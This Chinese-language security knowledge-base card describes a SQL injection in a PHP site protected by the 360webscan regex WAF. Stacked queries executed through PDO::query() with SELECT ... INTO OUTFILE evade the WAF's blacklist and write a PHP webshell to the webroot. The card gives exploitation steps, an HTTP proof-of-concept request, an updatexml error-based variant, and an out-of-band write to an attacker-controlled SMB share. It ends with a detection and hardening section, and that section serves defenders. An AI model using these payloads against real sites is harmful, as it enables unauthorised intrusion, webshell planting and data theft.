---
id: web-generic-sqli-360webscan-stacked-outfile-webshell
title: 360webscan 黑名单下的堆叠注入写 WebShell：PDO query 直执行 `;SELECT ... INTO OUTFILE`，绕开 union/and 与函数过滤
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-360webscan-stacked-into-outfile
tags:
- sqli
- mysql
- stacked-query
- into-outfile
- waf-bypass
- 360webscan
- pdo
- webshell
- php
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-22
  verified_at: '2026-11-08T13:49:43+08:00'
  notes: 已对照原文核对：getColumn 注入点（pre_orders 查询拼接 $sql）、PDO query 支持多语句、360webscan getfilter 正则无 INTO OUTFILE/分号匹配、;SELECT ... INTO OUTFILE 写 caigo.php 并 phpinfo 落地截图、updatexml 报错变体与 SQL 日志、写远程共享带外验证均与原文截图一致；PoC（HTTP 请求包）完整；与 order-by-into-outfile 卡确认为不同注入位置与绕过对象，dedup_review 理由成立；与白名单卡判 related 并列保留；未验证点：MySQL secure_file_priv 未在原文讨论
url: /docs/web/generic/sqli/web-generic-sqli-360webscan-stacked-outfile-webshell/
draft: false
kb_aliases:
- 360webscan 绕过
- webscan_getfilter 绕过
- 堆叠注入写 shell
- INTO OUTFILE 写 webshell
- PDO 多语句注入
- 彩虹发卡二开 前台注入
- getColumn 注入
- 分号堆叠绕过 WAF
---

## 一句话结论

当 PHP 站点用 PDO 的 `query()` 直接执行拼接 SQL、并挂载 360webscan 这类纯正则黑名单 WAF 时，把 `?type=` 参数闭合后用分号堆叠 `;SELECT '<?php ...?>' INTO OUTFILE '<webroot>/x.php' -- `，既能绕过 `union.+select`、`and/or` 比较式、`concat(`、`sleep(`、`benchmark(` 等全部 get 过滤规则，又能直接落一个可访问的 WebShell。

## 原理

- **注入点没有做任何处理**：前台列表页把 `$_GET['type']` 直接拼进 `$sql`（`$sql .= " AND status = '{$_GET['type']}'"`），唯一校验是 `$_GET['type'] >= 0` 这种弱类型比较，以数字开头的任意字符串都能通过；从取参到 `$DB->getColumn($sql)` 之间既无 `addslashes` 也无 `intval`。
- **PDO 会执行整条多语句**：`getColumn()` 只是 `$this->query($sql)` → `$this->link->query($sql)`，走 `PDO::query()` 而非预处理绑定。MySQL 服务端本身支持多语句，客户端只要把完整字符串发过去就会逐条执行；`PDO::query()` 只返回第一条语句的结果集，后续语句的结果被丢弃，但副作用（写文件、更新数据）照常发生。这就是“页面正常返回、文件已经落地”的原因。
- **360webscan 是正则黑名单，不是语义分析**：`webscan_getfilter` 用一条大正则匹配危险形态，命中就 `exit(webscan_page())` 输出“输入内容存在危险字符”。它能拦：
  - `\b(and|or)\b\s*(...=...)`：布尔条件式；
  - `UNION.+?SELECT`、`(SELECT|DELETE)...FROM`：联合查询；
  - `(group_)?concat\s*(`、`case ... when (`、`load_file\s*(`、`sleep\s*(`、`benchmark\s*(`；
  - `UPDATE ... SET`、`INSERT INTO ... VALUES`、`(CREATE|ALTER|DROP|TRUNCATE) TABLE|DATABASE`；
  - `/\*.*\*/` 注释块、`<script`、`data:text/html` 等 XSS 形态。
- **绕过点就是规则没覆盖的语法**：分号 `;` + `SELECT` 不构成 `UNION SELECT`，也不构成 `AND`/`OR` 比较式；`INTO OUTFILE` 完全不在规则里，因此“堆叠 + 写文件”这条路整条没被拦。同理，注释如果写成 `-- `（连字符加空格）而不是 `/**/`，也不会命中注释块规则。
- **写文件成功的前提**：数据库账号具备 `FILE` 权限、`secure_file_priv` 为空或包含目标目录、Web 目录对 MySQL 进程可写、路径使用目标操作系统能识别的分隔符（Windows 反斜杠需在 SQL 中按字符串转义成双反斜杠）。

## 触发条件

- 存在字符串拼接进 PDO `query()`/`exec()` 的注入点，且未做转义或强类型转换。
- 数据库为 MySQL（`INTO OUTFILE` 语法），账号有 `FILE` 权限，`secure_file_priv` 未限制到无关目录。
- Web 根目录与数据库同机（或可通过 UNC 路径写到可控主机），且目录可写。
- WAF 为 360webscan 一类固定正则黑名单，且未额外追加 `;`、`INTO OUTFILE`、`SELECT` 单独出现等规则。
- 目标未开启 `open_basedir`/禁用 `INTO OUTFILE` 的加固策略。

## 利用步骤

1. 定位拼接点：全局搜 `getColumn(`/`get_row(`/`query(` 等封装方法，回溯参数是否来自 `$_GET`/`$_POST` 且中间无 `addslashes`、`intval`、`daddslashes`。
2. 确认 WAF：提交 `?type=123 and sleep(5)` 若返回“输入内容存在危险字符，安全起见，已被本站拦截”，全局搜该文案定位 `includes/360safe/360webscan.php`，读取 `$getfilter`/`$postfilter` 判断哪些语法未被覆盖。
3. 探测堆叠是否可用：`?type=123';SELECT 1 -- ` 观察是否 200 且列表正常（`PDO::query()` 多语句被接受）。若报错则说明驱动关闭了多语句，改用其它路径。
4. 探测写权限：`?type=123';SELECT 'x' INTO OUTFILE '<绝对路径>/test.txt' -- `，再访问确认；不确定路径时先用 UNC 写远程共享做带外探测。
5. 落 shell：`?type=123';SELECT '<?php phpinfo();?>' INTO OUTFILE '<webroot>/x.php' -- `，访问 `http://target/x.php` 验证；随后替换为功能更完整的 Webshell 或直接写内存马配置。
6. 清理：删除探测用的 `test.txt`，记录写入路径便于后续处置。

## PoC

```http
GET /user/xxx.php?type=123';SELECT '<?php phpinfo();?>' INTO OUTFILE 'D://phpstudy_pro/WWW/x.php' --  HTTP/1.1
Host: target:port
Cookie: PHPSESSID=<session>; user_token=<token>
X-Requested-With: XMLHttpRequest
Referer: http://target/user/
```

响应仍返回正常的订单列表页面（第一条语句结果被 `PDO::query()` 取走，堆叠语句静默执行），随后访问 `http://target/x.php` 得到 phpinfo，证明写文件成功。

## 变体与关联

- 变体（报错注入）：`concat(` 被黑名单拦时，用 `REPLACE(REPLACE('~1~','1',database()),'~',0x7e)` 代替 `concat()` 构造 `updatexml(1, IF(1=1, <expr>, 1), 1)`，同样不命中 `(group_)?concat` 规则；错误信息里的 `XPATH syntax error: '~dbname~'` 即为回显。
- 变体（带外探测）：`SELECT user() INTO OUTFILE '\\\\attacker\\share\\2.txt'` 把查询结果写到 SMB 共享，用来验证写文件能力与网络连通性；MySQL 在 Linux 上不支持 UNC，需目标为 Windows。
- 变体（白名单绕过）：360webscan 的 `webscan_white_url` 命中后台接口时整个请求不过滤，参见 `[[web-generic-sqli-360webscan-whitelist-url-bypass]]`。
- 关联：`[[web-generic-sqli-fortiweb-fabric-bearer-outfile-pth-rce]]`（同类 `INTO OUTFILE` 落文件变形）、`[[web-generic-sqli-mssql-stacked-xp-cmdshell]]`（其它数据库的堆叠利用）。
- 边界：`secure_file_priv` 非空、MySQL 以低权限账户运行、Web 目录不可写、PDO 关闭多语句（`PDO::MYSQL_ATTR_MULTI_STATEMENTS => false`）时该链不成立。

## 检测与防御

- **代码层**：所有 SQL 使用预处理绑定；`PDO::query()`/`exec()` 只用于无参静态语句；对 `type` 这类本应是整型的参数强制 `intval`。
- **数据库层**：设置 `secure_file_priv` 到专用目录、回收业务账号的 `FILE` 权限、禁用 `INTO OUTFILE`/`INTO DUMPFILE`；开启 general log 或 audit 插件，监控含 `INTO OUTFILE`、`INTO DUMPFILE` 的语句。
- **WAF 层**：不要依赖单一正则黑名单；360webscan 这类脚本需补充 `;` 堆叠、`INTO OUTFILE`、单独 `SELECT ... FROM`、`updatexml`/`extractvalue`、`REPLACE(` 等规则，或改用语义/语法分析型 WAF。
- **主机层**：监控 Web 目录新增 `.php` 文件（尤其内容含 `<?php` 且由数据库进程写入）；对 Web 根目录设置只读或写入审计；关注 MySQL 进程对 Web 目录的写操作与创建的文件属主异常。
- **响应**：排查 Web 目录近期新增/修改的脚本、数据库 `general_log` 中的 `INTO OUTFILE` 记录、以及 `/user/*.php?type=` 相关异常请求；删除落地文件并轮换数据库与站点凭据。
